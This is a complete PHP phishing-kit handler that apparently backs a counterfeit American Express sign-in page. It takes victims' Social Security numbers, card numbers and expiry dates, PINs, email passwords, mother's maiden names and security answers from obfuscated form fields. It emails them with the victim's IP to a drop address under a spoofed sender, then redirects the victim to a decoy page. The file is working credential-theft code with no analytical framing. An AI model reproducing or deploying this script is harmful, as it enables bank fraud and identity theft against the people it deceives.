<?php
$ip = getenv("REMOTE_ADDR");
$message .= "-----------AmeMoney-----------\n";
$message .= "SSN: ".$_POST['fzxt']."\n";
$message .= "S-PIN: ".$_POST['wolowo']."\n";
$message .= "CC Number: ".$_POST['dtb']."\n";
$message .= "Exp Date: ".$_POST['aso1']."\n";
$message .= "Email Address: ".$_POST['fyxt']."\n";
$message .= "Email Password: ".$_POST['wxlwo']."\n";
$message .= "MMN: ".$_POST['gttb']."\n";

$message .= "Security Answer: ".$_POST['asto1']."\n";
$message .= "IP : ".$ip."\n";
$message .= "------------------------\n";

$send = "youremail@gmail.com";
$subject = "Ameican Expo - $ip";
$headers = "From: American Exp<Ortis@wixema.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
}
header("Location: last.html?section=signinpage&update=&cookiecheck=yes&destination=nba/signin&accpening/App$update=&cookiecheck=yes&destinpage&update=&cookiecheck=");

	 
?>